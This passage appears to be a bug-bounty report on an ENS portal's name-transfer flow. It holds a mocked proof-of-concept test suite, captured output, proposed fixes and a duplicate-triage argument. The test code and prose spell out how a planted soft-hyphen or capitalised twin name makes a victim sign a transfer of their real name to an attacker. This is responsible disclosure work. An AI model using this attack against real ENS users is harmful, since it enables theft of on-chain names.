 * happy-dom environment from the repository's existing apps/portal/vitest.config.ts.
 */

import { ok } from 'neverthrow'
import {
  type Address,
  createClient,
  custom,
  decodeFunctionData,
  encodeAbiParameters,
  erc1155Abi,
  type Hex,
  labelhash,
  parseAbiParameters,
  type PublicClient,
  type WalletClient,
  zeroAddress,
} from 'viem'
import { sepolia } from 'viem/chains'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import React from 'react'

// ---------------------------------------------------------------------------
// The two names. `HOSTILE` renders identically to `REAL` in every browser: the
// only difference is U+00AD SOFT HYPHEN, which has no glyph.
// ---------------------------------------------------------------------------

const REAL = 'vitalik.eth'
const HOSTILE = 'vitalik­.eth' // U+00AD SOFT HYPHEN — zero-width, no glyph
const CONTROL = 'alice.eth' // already normalized; used as the negative control
const CASED = 'Vitalik.eth' // no deceptive character at all — just a capital V

const REAL_LABEL = 'vitalik'
const HOSTILE_LABEL = 'vitalik­'
const CONTROL_LABEL = 'alice'
const CASED_LABEL = 'Vitalik'

const VICTIM = '0x1111111111111111111111111111111111111111' as Address
const ATTACKER = '0x2222222222222222222222222222222222222222' as Address
const ETH_REGISTRY = '0x00000000000000000000000000000000000e7000' as Address
const ROOT_REGISTRY = '0x00000000000000000000000000000000000000ff' as Address

// ---------------------------------------------------------------------------
// In-memory registry. Keyed by the LITERAL label bytes, which is how the ENS
// registries key names: normalization is a client-side convention, never
// enforced on-chain. The attacker paid to register HOSTILE_LABEL directly to
// the victim (the v2 ETHRegistrar's `register` takes `owner` as an argument).
// ---------------------------------------------------------------------------

const OWNER_BY_LABEL = new Map<string, Address>([
  [REAL_LABEL, VICTIM], // the victim's real name
  [HOSTILE_LABEL, VICTIM], // planted by the attacker, registered TO the victim
  [CONTROL_LABEL, VICTIM],
  [CASED_LABEL, VICTIM], // the same plant, with no invisible codepoint at all
])

/** Versioned ERC-1155 id, modelled the way PermissionedRegistry derives it. */
const tokenIdOf = (label: string): bigint =>
  ((BigInt(labelhash(label)) >> 32n) << 32n) | 1n

/** Reverse of viem's `packetToBytes` — test scaffolding, not app logic. */
function decodeDnsPacket(hex: Hex): string {
  const bytes = Buffer.from(hex.slice(2), 'hex')
  const labels: string[] = []
  let i = 0
  while (i < bytes.length && bytes[i] !== 0) {
    const len = bytes[i]
    labels.push(bytes.subarray(i + 1, i + 1 + len).toString('utf8'))
    i += 1 + len
  }
  return labels.join('.')
}

const seenCalls: string[] = []

const transport = custom({
  async request({ method, params }: { method: string; params?: any }) {
    if (method === 'eth_chainId') return `0x${sepolia.id.toString(16)}`
    if (method !== 'eth_call') throw new Error(`unexpected RPC: ${method}`)

    const { to, data } = params[0] as { to: Address; data: Hex }
    const selector = data.slice(0, 10)

    const urAbi = [
      {
        type: 'function',
        name: 'findOwner',
        stateMutability: 'view',
        inputs: [{ name: 'name', type: 'bytes' }],
        outputs: [{ name: '', type: 'address' }],
      },
      {
        type: 'function',
        name: 'findRegistries',
        stateMutability: 'view',
        inputs: [{ name: 'name', type: 'bytes' }],
        outputs: [{ name: '', type: 'address[]' }],
      },
      {
        type: 'function',
        name: 'getTokenId',
        stateMutability: 'view',
        inputs: [{ name: 'labelHash', type: 'uint256' }],
        outputs: [{ name: '', type: 'uint256' }],
      },
    ] as const

    const { functionName, args } = decodeFunctionData({ abi: urAbi, data })

    if (functionName === 'findOwner') {
      const name = decodeDnsPacket(args[0] as Hex)
      const label = name.split('.')[0]
      const owner = OWNER_BY_LABEL.get(label) ?? zeroAddress
      seenCalls.push(`findOwner(${JSON.stringify(name)}) -> ${owner}`)
      return encodeAbiParameters(parseAbiParameters('address'), [owner])
    }

    if (functionName === 'findRegistries') {
      const name = decodeDnsPacket(args[0] as Hex)
      seenCalls.push(`findRegistries(${JSON.stringify(name)})`)
      // leaf-first: [own subregistry, containing registry, ..., root]
      return encodeAbiParameters(parseAbiParameters('address[]'), [
        [zeroAddress, ETH_REGISTRY, ROOT_REGISTRY],
      ])
    }

    if (functionName === 'getTokenId') {
      const labelHash = args[0] as bigint
      const label = [...OWNER_BY_LABEL.keys()].find(
        (l) => BigInt(labelhash(l)) === labelHash,
      )
      if (!label) throw new Error(`unknown labelhash ${labelHash}`)
      const id = tokenIdOf(label)
      seenCalls.push(
        `getTokenId@${to}(labelhash(${JSON.stringify(label)})) -> ${id}`,
      )
      return encodeAbiParameters(parseAbiParameters('uint256'), [id])
    }

    throw new Error(`unexpected call ${selector}`)
  },
})

// Same chain construction the app performs in src/lib/wagmi.ts, so the ENS
// contract addresses the actions look up are the real ones.
const chainWithEns = extendChainWithEns(sepolia)

const client = createClient({
  chain: chainWithEns as any,
  transport,
}) as any

// The app reads its viem client through this helper; hand it the fake chain.
vi.mock('@/lib/wagmi/helpers', () => ({
  safeGetClient: () => ok(client),
}))

// Capture what the transaction manager is actually asked to sign.
const { startTransaction, waitForTransaction } = vi.hoisted(() => ({
  startTransaction: vi.fn(() => 'tx-poc-1'),
  waitForTransaction: vi.fn(async () => ({ hash: '0xdeadbeef' })),
}))

vi.mock('@ens-apps/transaction-manager', () => ({
  transactionManager: { startTransaction },
  waitForTransaction,
}))

// ---------------------------------------------------------------------------
// Everything below is only needed so the REAL `useTransferName` hook can be
// mounted (tests 7, 8 and 9). None of it touches the name, the label, the token id
// or the calldata — those all come from the app's own code.
// ---------------------------------------------------------------------------

const hookWalletClient = { account: { address: VICTIM } } as any

vi.mock('@wagmi/core/actions', () => ({
  getWalletClient: async () => hookWalletClient,
}))
vi.mock('@/features/registry/utils/signer.helpers', () => ({
  createEOASigner: () => ({ type: 'eoa', walletClient: hookWalletClient }),
}))
vi.mock('wagmi', async (importOriginal) => ({
  ...(await importOriginal<typeof import('wagmi')>()),
  useConfig: () => ({}),
  usePublicClient: () => ({}),
}))
vi.mock('@tanstack/react-router', () => ({ useNavigate: () => vi.fn() }))
// `useTransferName` imports src/lib/wagmi only for the chain id. Importing it
// for real pulls in AppKit, which reads localStorage and fetches remote config
// at module scope. Neither is relevant to the bug, and the second would make
// the test hit the network, so supply just the chain.
vi.mock('@/lib/wagmi', () => ({ sepoliaWithEns: extendChainWithEns(sepolia) }))
vi.mock('@/features/transaction-manager/hooks/useTransactionModal', () => ({
  useTransactionModal: () => ({
    openModal: vi.fn(),
    closeModal: vi.fn(),
    clearTransaction: vi.fn(),
  }),
}))
vi.mock('@/utils/query/pollForIndexerSync', () => ({
  pollForIndexerSync: vi.fn(),
}))

// ---------------------------------------------------------------------------
// Real modules under test.
// ---------------------------------------------------------------------------

import type { Signer } from '@ens-apps/transaction-manager'
import { getEnsTokenId } from '@/features/profile/hooks/useTokenId'
import { transferToken } from '@/features/transfer/helpers/transferToken'
import { mergeOwnedNames } from '@/features/dashboard/utils/ownedNamesUtils'
import { resolveEnsOwner } from '@/utils/ens/resolveEnsOwner'
import { getLabel } from '@/utils/token/getLabel'
import { isValidEnsName } from '@/utils/token/isNormalized'
import { useTransferName } from '@/features/transfer/hooks/useTransferName'

const walletClient = {
  account: { address: VICTIM },
} as unknown as WalletClient
const publicClient = {} as PublicClient
const signer = { type: 'eoa', walletClient } as unknown as Signer

/**
 * Replays exactly what the transfer route + `useTransferName` do, in order,
 * calling the app's own functions at every step:
 *
 *   transfer.tsx:27       getEnsOwnerQueryOptions({ name })  -> resolveEnsOwner(raw name)
 *   transfer.tsx:104      isAddressEqual(address, data.owner)
 *   useTransferName:112-115  getEnsTokenId({ label: getLabel(name), registryAddress })
 *   useTransferName:143      transferToken({ ..., tokenId })
 */
async function runTransferFlow(routeParam: string, connected: Address) {
  const owned = await resolveEnsOwner(client, routeParam)
  if (!owned) throw new Error('name not owned')

  // transfer.tsx:104 — the whole authorization decision.
  const gatePasses = owned.owner.toLowerCase() === connected.toLowerCase()

  // useTransferName.ts:112-115 — the divergent derivation.
  const normalizedLabel = getLabel(routeParam)
  const tokenIdResult = await getEnsTokenId({
    label: normalizedLabel,
    registryAddress: owned.registryAddress,
  })
  if (tokenIdResult.isErr()) throw tokenIdResult.error
  const tokenId = tokenIdResult.value

  startTransaction.mockClear()
  await transferToken({
    name: routeParam,
    registryAddress: owned.registryAddress,
    tokenId,
    recipient: ATTACKER,
    walletClient,
    publicClient,
    signer,
    chainId: sepolia.id,
    id: `transfer-${routeParam}-transfer-token`,
  })

  const [request, , options] = startTransaction.mock.calls[0] as any
  const decoded = decodeFunctionData({
    abi: erc1155Abi,
    data: request.request.data as Hex,
  })

  return {
    gatePasses,
    owner: owned.owner,
    registryAddress: owned.registryAddress,
    normalizedLabel,
    tokenIdFromFlow: tokenId,
    calldata: request.request.data as Hex,
    calldataFunction: decoded.functionName,
    calldataTokenId: (decoded.args as readonly unknown[])[2] as bigint,
    calldataTo: request.request.to as Address,
    description: options.description as string,
  }
}

beforeEach(() => {
  seenCalls.length = 0
})

describe('transfer authorizes the raw route parameter, moves the normalized one', () => {
  it('1. the app already has a guard that rejects the hostile string — the transfer route never calls it', () => {
    expect(isValidEnsName(REAL)).toBe(true)
    expect(isValidEnsName(HOSTILE)).toBe(false)
    console.log(
      `\n[1] isValidEnsName(${JSON.stringify(REAL)}) = ${isValidEnsName(REAL)}` +
        `\n    isValidEnsName("vitalik\\u00AD.eth") = ${isValidEnsName(HOSTILE)}` +
        `\n    -> the guard exists; routes/$name/ownership/transfer.tsx does not use it`,
    )
  })

  it('2. the two names are distinct on-chain assets with distinct token ids', () => {
    expect(HOSTILE_LABEL).not.toBe(REAL_LABEL)
    expect(labelhash(HOSTILE_LABEL)).not.toBe(labelhash(REAL_LABEL))
    expect(tokenIdOf(HOSTILE_LABEL)).not.toBe(tokenIdOf(REAL_LABEL))
    console.log(
      `\n[2] labelhash("vitalik")        = ${labelhash(REAL_LABEL)}` +
        `\n    labelhash("vitalik\\u00AD")  = ${labelhash(HOSTILE_LABEL)}` +
        `\n    -> two separate registry entries, two separate ERC-1155 ids`,
    )
  })

  it('3. getLabel collapses the hostile name onto the victim real label', () => {
    expect(getLabel(HOSTILE)).toBe(REAL_LABEL)
    expect(getLabel(HOSTILE)).not.toBe(HOSTILE_LABEL)
    console.log(
      `\n[3] getLabel("vitalik\\u00AD.eth") = ${JSON.stringify(getLabel(HOSTILE))}` +
        `\n    -> normalization erases the difference the authorization read relies on`,
    )
  })

  it('4. the gate passes on the planted name while the signed calldata moves the real one', async () => {
    const result = await runTransferFlow(HOSTILE, VICTIM)

    // The route's authorization decision succeeded...
    expect(result.gatePasses).toBe(true)
    expect(result.owner.toLowerCase()).toBe(VICTIM.toLowerCase())

    // ...and it succeeded because the app asked the chain about the RAW string.
    // This is the assertion that breaks the moment the owner read (or anything
    // upstream of it) normalizes the route parameter.
    expect(seenCalls[0]).toContain(`findOwner(${JSON.stringify(HOSTILE)})`)
    expect(seenCalls[0]).not.toContain(`findOwner(${JSON.stringify(REAL)})`)

    // ...but the calldata targets a different asset than the one authorized.
    expect(result.calldataFunction).toBe('safeTransferFrom')
    expect(result.calldataTokenId).toBe(tokenIdOf(REAL_LABEL))
    expect(result.calldataTokenId).not.toBe(tokenIdOf(HOSTILE_LABEL))

    // And the only human-readable string on the transaction is the raw one.
    expect(result.description).toBe(`Transfer ${HOSTILE}`)
    expect(result.description).not.toContain(REAL_LABEL + '.eth')

    console.log(
      `\n[4] route parameter        = "vitalik\\u00AD.eth"` +
        `\n    owner read for it      = ${result.owner}  (gate passes: ${result.gatePasses})` +
        `\n    registry               = ${result.registryAddress}` +
        `\n    getLabel(param)        = ${JSON.stringify(result.normalizedLabel)}` +
        `\n    token id in calldata   = ${result.calldataTokenId}` +
        `\n      id of "vitalik"      = ${tokenIdOf(REAL_LABEL)}   <== MATCHES` +
        `\n      id of "vitalik\\u00AD" = ${tokenIdOf(HOSTILE_LABEL)}   <== the asset actually authorized` +
        `\n    tx description         = ${JSON.stringify(result.description)}` +
        `\n    calldata               = ${result.calldata}` +
        `\n    RPC seen: \n      ${seenCalls.join('\n      ')}`,
    )
  })

  it('5. negative control: an already-normalized name authorizes and transfers the same asset', async () => {
    const result = await runTransferFlow(CONTROL, VICTIM)
    expect(result.gatePasses).toBe(true)
    expect(result.calldataTokenId).toBe(tokenIdOf(CONTROL_LABEL))
    console.log(
      `\n[5] route parameter "alice.eth" -> token id ${result.calldataTokenId} = id of "alice". No divergence.`,
    )
  })

  it('6. the dashboard de-dupes owned names case-insensitively, so only an invisible variant survives to be clicked', () => {
    const withInvisible = mergeOwnedNames([], [{ name: REAL }, { name: HOSTILE }])
    const withUppercase = mergeOwnedNames([], [{ name: REAL }, { name: 'VITALIK.eth' }])

    expect(withInvisible).toHaveLength(2)
    expect(withUppercase).toHaveLength(1)

    console.log(
      `\n[6] mergeOwnedNames(["vitalik.eth", "vitalik\\u00AD.eth"]) -> ${withInvisible.length} rows` +
        `\n    mergeOwnedNames(["vitalik.eth", "VITALIK.eth"])      -> ${withUppercase.length} row` +
        `\n    -> an uppercase homoglyph is swallowed by the dedup; the invisible one is listed`,
    )
  })
})

// ---------------------------------------------------------------------------
// Tests 7 and 8 mount the REAL `useTransferName` hook through `renderHook` and
// assert on what IT emits, rather than replaying its steps by hand. That makes
// them a mutation oracle: change `getLabel(name)` to the raw label at
// src/features/transfer/hooks/useTransferName.ts:113 and tests 7 and 9 fail (:132
// is the one test 8 keys on), because the
// in-memory `getTokenId` is an honest oracle — it answers for WHICHEVER label
// the app actually hashed, so a hook that stops normalizing gets the twin's id
// back and the assertion breaks. Tests 1-6 above, which re-derive the label
// themselves, survive that mutation; this is the gap they leave.
// ---------------------------------------------------------------------------

const makeWrapper = () => {
  const qc = new QueryClient({
    defaultOptions: { queries: { retry: false }, mutations: { retry: false } },
  })
  return ({ children }: { children: React.ReactNode }) =>
    React.createElement(QueryClientProvider, { client: qc }, children)
}

describe('the real useTransferName hook, mounted', () => {
  beforeEach(() => {
    startTransaction.mockClear()
  })

  it('7. mounted hook: safeTransferFrom carries the id of "vitalik" for a route param of the U+00AD twin', async () => {
    const { result } = renderHook(
      () =>
        useTransferName({
          name: HOSTILE,
          registryAddress: ETH_REGISTRY,
          owner: VICTIM,
        }),
      { wrapper: makeWrapper() },
    )

    await act(async () => {
      result.current.startTransfer({
        recipient: ATTACKER,
        options: {
          setEthAddress: false,
          detachResolver: false,
          detachRegistry: false,
        },
      })
    })
    await waitFor(() => expect(result.current.transactions.length).toBe(1))

    const step = result.current.transactions[0]!
    expect(step.id).toBe(`transfer-${HOSTILE}-transfer-token`)
    expect(step.transactionName).toBe(`Transfer name - ${HOSTILE}`)

    await act(async () => {
      await step.onStart!()
    })

    expect(startTransaction).toHaveBeenCalledTimes(1)
    const [req, , opts] = startTransaction.mock.calls[0] as any
    const decoded = decodeFunctionData({
      abi: erc1155Abi,
      data: req.request.data as Hex,
    })
    const tokenId = (decoded.args as readonly unknown[])[2] as bigint

    console.log(
      `\n[7] MOUNTED useTransferName({ name: "vitalik\\u00AD.eth" })` +
        `\n    RPC the hook itself issued : ${seenCalls.join(' | ')}` +
        `\n    calldata                   : ${decoded.functionName}` +
        `\n    token id emitted           : ${tokenId}` +
        `\n      id of "vitalik"          : ${tokenIdOf(REAL_LABEL)}   <== MATCHES` +
        `\n      id of the twin           : ${tokenIdOf(HOSTILE_LABEL)}` +
        `\n    tx description             : ${JSON.stringify(opts.description)}`,
    )

    expect(decoded.functionName).toBe('safeTransferFrom')
    expect((decoded.args as readonly unknown[])[1]).toBe(ATTACKER)
    // THE MUTATION ORACLE: this is the assertion that dies if :113 stops
    // normalizing, because the transport answers for whatever it was asked.
    expect(tokenId).toBe(tokenIdOf(REAL_LABEL))
    expect(tokenId).not.toBe(tokenIdOf(HOSTILE_LABEL))
    expect(seenCalls).toEqual([
      `getTokenId@${ETH_REGISTRY}(labelhash(${JSON.stringify(REAL_LABEL)})) -> ${tokenIdOf(REAL_LABEL)}`,
    ])
    expect(opts.description).toBe(`Transfer ${HOSTILE}`)
  })

  it('8. mounted hook: the PRE-transfer detach-resolver step also targets the real name', async () => {
    const { result } = renderHook(
      () =>
        useTransferName({
          name: HOSTILE,
          registryAddress: ETH_REGISTRY,
          owner: VICTIM,
        }),
      { wrapper: makeWrapper() },
    )

    await act(async () => {
      result.current.startTransfer({
        recipient: ATTACKER,
        options: {
          setEthAddress: false,
          detachResolver: true,
          detachRegistry: false,
        },
      })
    })
    await waitFor(() => expect(result.current.transactions.length).toBe(2))

    // buildTransferPlan puts the detach steps BEFORE the token transfer.
    const detach = result.current.transactions[0]!
    expect(detach.id).toBe(`transfer-${HOSTILE}-detach-resolver`)

    await act(async () => {
      await detach.onStart!()
    })

    expect(startTransaction).toHaveBeenCalledTimes(1)
    const [req, , opts] = startTransaction.mock.calls[0] as any
    const calldata = req.request.data as string
    // setResolverWriteParameters uses BigInt(labelhash(label)) as the token id,
    // so the raw 32-byte labelhash appears verbatim in the calldata.
    const realHash = labelhash(REAL_LABEL).slice(2)
    const twinHash = labelhash(HOSTILE_LABEL).slice(2)

    console.log(
      `\n[8] first transaction of the flow : ${detach.title} — ${JSON.stringify(opts.description)}` +
        `\n    calldata                      : ${calldata}` +
        `\n    contains labelhash("vitalik") : ${calldata.includes(realHash)}   <== the victim's real name` +
        `\n    contains labelhash(twin)      : ${calldata.includes(twinHash)}` +
        `\n    -> setResolver(<real name>, 0x0) is signed BEFORE the token ever moves`,
    )

    expect(opts.description).toBe(`Detach resolver for ${HOSTILE}`)
    expect(calldata.includes(realHash)).toBe(true)
    expect(calldata.includes(twinHash)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Test 9 exists for the duplicate analysis. The divergence does not need a
// deceptive character: a plain capital letter is enough. Every codepoint of
// "Vitalik.eth" is ASCII [A-Za-z.] — not a homoglyph, not a bidirectional or
// other control character, not a leading or trailing dot.
// ---------------------------------------------------------------------------

describe('the divergence needs no deceptive character', () => {
  beforeEach(() => {
    startTransaction.mockClear()
  })

  it('9. a plain capital letter drives the same divergence through the mounted hook', async () => {
    // Nothing deceptive is present in the string at all.
    const codepoints = [...CASED].map((c) => c.codePointAt(0)!)
    expect(codepoints.every((cp) => cp < 0x80)).toBe(true)
    expect(/^[A-Za-z.]+$/.test(CASED)).toBe(true)

    expect(getLabel(CASED)).toBe(REAL_LABEL)
    expect(labelhash(CASED_LABEL)).not.toBe(labelhash(REAL_LABEL))

    const { result } = renderHook(
      () =>
        useTransferName({
          name: CASED,
          registryAddress: ETH_REGISTRY,
          owner: VICTIM,
        }),
      { wrapper: makeWrapper() },
    )
    await act(async () => {
      result.current.startTransfer({
        recipient: ATTACKER,
        options: {
          setEthAddress: false,
          detachResolver: false,
          detachRegistry: false,
        },
      })
    })
    await waitFor(() => expect(result.current.transactions.length).toBe(1))
    await act(async () => {
      await result.current.transactions[0]!.onStart!()
    })

    const [req, , opts] = startTransaction.mock.calls[0] as any
    const decoded = decodeFunctionData({
      abi: erc1155Abi,
      data: req.request.data as Hex,
    })
    const tokenId = (decoded.args as readonly unknown[])[2] as bigint

    console.log(
      `\n[9] route parameter        = ${JSON.stringify(CASED)}  (all codepoints < 0x80)` +
        `\n    getLabel(param)        = ${JSON.stringify(getLabel(CASED))}` +
        `\n    labelhash("Vitalik")   = ${labelhash(CASED_LABEL)}` +
        `\n    labelhash("vitalik")   = ${labelhash(REAL_LABEL)}` +
        `\n    token id emitted       = ${tokenId}  = id of "vitalik"` +
        `\n    tx description         = ${JSON.stringify(opts.description)}` +
        `\n    -> no homoglyph, no control character, no leading/trailing dot`,
    )

    expect(tokenId).toBe(tokenIdOf(REAL_LABEL))
    expect(tokenId).not.toBe(tokenIdOf(CASED_LABEL))
    expect(opts.description).toBe(`Transfer ${CASED}`)
  })
})
```

### 5. Captured output

Run with `--reporter=verbose --disable-console-intercept` so the console lines are visible:

```
[1] isValidEnsName("vitalik.eth") = true
    isValidEnsName("vitalik\u00AD.eth") = false
    -> the guard exists; routes/$name/ownership/transfer.tsx does not use it

[2] labelhash("vitalik")        = 0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
    labelhash("vitalik\u00AD")  = 0x1c2d43d4ce9f7dba04fd5a4445a0f11b0a8c11788374634f83b2254ade57c899
    -> two separate registry entries, two separate ERC-1155 ids

[3] getLabel("vitalik\u00AD.eth") = "vitalik"
    -> normalization erases the difference the authorization read relies on

[4] route parameter        = "vitalik\u00AD.eth"
    owner read for it      = 0x1111111111111111111111111111111111111111  (gate passes: true)
    registry               = 0x00000000000000000000000000000000000e7000
    getLabel(param)        = "vitalik"
    token id in calldata   = 79233663829379634837589865448569342784712482819484549289560981379857392861185
      id of "vitalik"      = 79233663829379634837589865448569342784712482819484549289560981379857392861185   <== MATCHES
      id of "vitalik\u00AD" = 12744736032520357497788819099695184492785319752436446104014148216060590948353   <== the asset actually authorized
    tx description         = "Transfer vitalik\u00AD.eth"
    calldata               = 0xf242432a00000000000000000000000011111111111111111111111111111111111111110000000000000000000000002222222222222222222222222222222222222222af2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a600000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000
    RPC seen:
      findOwner("vitalik\u00AD.eth") -> 0x1111111111111111111111111111111111111111
      findRegistries("vitalik\u00AD.eth")
      getTokenId@0x00000000000000000000000000000000000e7000(labelhash("vitalik")) -> 79233663829379634837589865448569342784712482819484549289560981379857392861185

[5] route parameter "alice.eth" -> token id 70564938991660933374592024341600875602376452319261984317470407481572850663425 = id of "alice". No divergence.

[6] mergeOwnedNames(["vitalik.eth", "vitalik\u00AD.eth"]) -> 2 rows
    mergeOwnedNames(["vitalik.eth", "VITALIK.eth"])       -> 1 row
    -> an uppercase homoglyph is swallowed by the dedup; the invisible one is listed

[7] MOUNTED useTransferName({ name: "vitalik\u00AD.eth" })
    RPC the hook itself issued : getTokenId@0x00000000000000000000000000000000000e7000(labelhash("vitalik")) -> 79233663829379634837589865448569342784712482819484549289560981379857392861185
    calldata                   : safeTransferFrom
    token id emitted           : 79233663829379634837589865448569342784712482819484549289560981379857392861185
      id of "vitalik"          : 79233663829379634837589865448569342784712482819484549289560981379857392861185   <== MATCHES
      id of the twin           : 12744736032520357497788819099695184492785319752436446104014148216060590948353
    tx description             : "Transfer vitalik\u00AD.eth"

[8] first transaction of the flow : Detach resolver — "Detach resolver for vitalik\u00AD.eth"
    calldata                      : 0xbc7b6d62af2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc0000000000000000000000000000000000000000000000000000000000000000
    contains labelhash("vitalik") : true   <== the victim's real name
    contains labelhash(twin)      : false
    -> setResolver(<real name>, 0x0) is signed BEFORE the token ever moves

[9] route parameter        = "Vitalik.eth"  (all codepoints < 0x80)
    getLabel(param)        = "vitalik"
    labelhash("Vitalik")   = 0x615cb04c18dfb06e81b5b2a6e67288bf2ea924ec7c44b72356dcf9c587d6ec04
    labelhash("vitalik")   = 0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
    token id emitted       = 79233663829379634837589865448569342784712482819484549289560981379857392861185  = id of "vitalik"
    tx description         = "Transfer Vitalik.eth"
    -> no homoglyph, no control character, no leading/trailing dot

 Test Files  1 passed (1)
      Tests  9 passed (9)
```

Test 5 is the negative control: a name that is already normalized drives both paths to the same id. Test 1 records that `isValidEnsName` rejects the hostile string, so the guard the transfer route omits demonstrably would have caught it.

Note in `[4]` and `[7]` that the ERC-1155 calldata literally contains `af2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a600000001` — the high 224 bits of `labelhash("vitalik")` with a version suffix — and in `[8]` that the `setResolver` calldata contains the full `labelhash("vitalik")` unmasked. Nothing derived from the string the victim was shown appears anywhere in either transaction except the description text.

### 6. Mutation testing, which is how I checked the PoC is an oracle

Two single-line mutations to the target, each applied, run, and reverted.

Changing `label: getLabel(name)` to `label: name.split('.')[0]!` in `useTransferName`'s `prepareMutation` makes tests 7 and 9 fail, each getting back the id of the label it actually hashed, while tests 1 to 6 still pass. Changing `const label = getLabel(name)` in the same file's `runStep` to `const label = name.split('.')[0]!` makes test 8 fail.

After reverting, the file was byte-compared against `HEAD` and the suite returned to 9 of 9 green.

## Recommended Mitigation

The minimal fix is to make the transfer path address exactly one name. Two changes, both small. I recommend both.

**1. Reject a non-normalized route parameter before the authorization read.** The function already exists and is already imported elsewhere in the route tree:

```diff
--- a/apps/portal/src/routes/$name/ownership/transfer.tsx
+++ b/apps/portal/src/routes/$name/ownership/transfer.tsx
@@
 import { useCanTransferName } from '@/features/transfer/hooks/useCanTransferName'
 import { is2LD } from '@/utils/ens/tldHelpers'
+import { isValidEnsName } from '@/utils/token/isNormalized'
@@
 function RouteComponent() {
   const { name } = Route.useParams()
   const { address } = useConnection()
 
+  // The owner is read for the raw parameter but every write is keyed on the
+  // normalized label, so a non-normalized parameter would authorize one name
+  // and operate on another. Refuse it outright.
+  if (!isValidEnsName(name))
+    return (
+      <MessageCard
+        icon={<AlertTriangle className="size-8" />}
+        title="This name can't be transferred here"
+        description={
+          <p>
+            This name isn't in its normalized form. Open the normalized name to
+            transfer it.
+          </p>
+        }
+      />
+    )
+
   const isSubname = !is2LD(name)
```

The same guard belongs on `routes/$name/ownership/index.tsx`, which is where the Transfer button is rendered.

**2. Close the divergence at its source, so no future caller can reopen it.** `useTransferName` is the function that holds both forms at once, and `useTransferDetachTargets` is the hook that reads one name's state to authorize a write against another. Make them assert the two agree rather than silently prefer one per call site:

```diff
--- a/apps/portal/src/features/transfer/hooks/useTransferName.ts
+++ b/apps/portal/src/features/transfer/hooks/useTransferName.ts
@@
+import { ens_normalize } from '@adraffy/ens-normalize'
 import type { Signer } from '@ens-apps/transaction-manager'
@@
 export const useTransferName = ({
   name,
   registryAddress,
   owner,
 }: UseTransferNameParams) => {
+  // The caller authorized `name` as given. Everything downstream keys off
+  // getLabel(name), which normalizes — if those disagree, every transaction in
+  // the plan would operate on a different asset than the one authorized.
+  if (ens_normalize(name) !== name) {
+    throw new Error(
+      `Refusing to transfer a non-normalized name: ${JSON.stringify(name)}`,
+    )
+  }
```

A cleaner variant of the same idea, if you would rather not throw from a hook: have `getEnsOwnerQueryOptions` take the normalized name and return it alongside the owner, and have the transfer flow consume *that* string rather than the route parameter. Then there is only one name in play from the gate to the calldata, and the property becomes structural instead of a check a later route can forget to call. This has to reach `useTransferDetachTargets` too — reading the resolver of one name and the role on another is the same defect in a second place.

A regression test worth keeping: assert that for any route parameter, the label used to derive the token id, the label handed to the detach helpers, and the string used for the owner lookup are the same string. Tests 7 to 9 above are that test, already written.

## Notes for triage: why this is not a duplicate of EXP-INPUT-005

The risk of a duplicate call here is real and I would rather put it in front of you than bury it. The nearest known issue is:

> **EXP-INPUT-005 — ENS name validators accept deceptive characters.** Severity: Medium, status open, fix ready (Manager and Explorer). "Our name validators accept inputs that ENS normalization later rejects or transforms, including homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot. The practical impact is homograph-style display confusion in our UI rather than incorrect resolution."

There is surface overlap, since both involve a non-normalized name reaching the app. Three things say the root cause is different. The first and the third are executed; the second is read from source, and I mark it as such.

**1. The Explorer's validator rejects the twin.** EXP-INPUT-005's stated root cause is that the validators *accept* what normalization rejects. The Explorer's validator does not accept this string. Executed, in test 1, against `apps/portal/src/utils/token/isNormalized.ts`:

```
isValidEnsName("vitalik.eth") = true
isValidEnsName("vitalik\u00AD.eth") = false
```

So the described defect, a permissive validator, is not what happens on this route. This route calls no validator at all. The app already owns a correct one and the transfer path never asks it. Tightening a validator that already returns `false` for this input does not touch this bug.

**2. The bug is a second derivation, not a permissive check** (code-traced, not executed). What the transfer route does is run two different derivations of the same input against the same chain: an unnormalized read for the authorization decision, through `resolveEnsOwner`, and a normalized derivation for every write, through `getLabel` into `getTokenId` and `setResolver`. That divergence survives any validator change. It is still there for every name that *is* normalized; it is just invisible because the two derivations agree. The failure is not that the user is confused about what they see. It is that the application authorizes an operation on asset X and then executes it against asset Y.

**3. The divergence needs no deceptive character at all.** EXP-INPUT-005 lists what it is about: homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot. `Vitalik.eth` is none of those. Every codepoint is ASCII in `[A-Za-z.]`. Not a homoglyph, not a control or format character, no leading or trailing dot. Executed twice: in test 9, where the mounted `useTransferName` emits the token id of `vitalik` for a `name` prop of `Vitalik.eth`, and on the fork at `[D]`, where `Forkdemo690161` registered as a distinct registry entry alongside `forkdemo690161`, both owned by the victim.

A validator that closes EXP-INPUT-005's list as written — reject homoglyphs, reject bidi and control characters, reject a leading or trailing dot — does not close this route. That matters because EXP-INPUT-005's status is "open, fix ready (Manager and Explorer)": the fix that is ready is a fix for those classes, and the gap is visible in the known issue's own wording before it ships.

**And the carve-out the known issue writes for itself.** EXP-INPUT-005 bounds its own impact to "homograph-style display confusion in our UI rather than incorrect resolution", and it is rated Medium on that basis. On this path there is no display confusion to speak of — the victim is looking at a name they genuinely own — and the consequence is an on-chain write against a different name than the one the app authorized. That is exactly the listed carve-out for "new consequences of a listed root cause that materially change its severity." If triage concludes the root causes really are the same, that carve-out is my fallback, and I would rather say so than pretend the first argument is airtight.

I am not claiming the classification is settled. What I am claiming, with executed evidence, is that EXP-INPUT-005's stated mechanism (permissive validators), its listed input classes (deceptive characters), and its stated impact ("rather than incorrect resolution") each fail to describe what happens here.

### Other known issues checked

